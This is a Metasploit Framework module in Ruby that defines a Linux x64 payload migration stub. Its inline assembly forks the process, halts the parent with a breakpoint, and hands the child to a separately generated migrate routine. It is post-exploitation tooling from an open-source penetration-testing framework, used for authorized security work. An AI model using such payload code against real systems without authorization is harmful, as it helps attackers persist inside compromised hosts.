# -*- coding: binary -*-
module Msf

###
#
# Payload that supports migration on x64.
#
###

module Payload::Linux::X64::Migrate


  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Linux Migration (x64)',
      'Description' => 'Migration stub x64',
      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X64
    ))
  end

  #
  # Constructs the migrate stub on the fly
  #
  def generate(opts={})
  # rax - payload address
  # rbx - current pid
  # ecx - fd
    asm = %^
      push rax ; payload address
      push rcx ; fd
      push rbx ; current pod
      xor rax, rax
      push 0x39
      pop rax
      syscall ; fork()
      cmp rax, 0
      jz _exec_child
_exec_parent:
      int 3
_exec_child:
      #{generate_migrate(opts)}
^

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

end

end

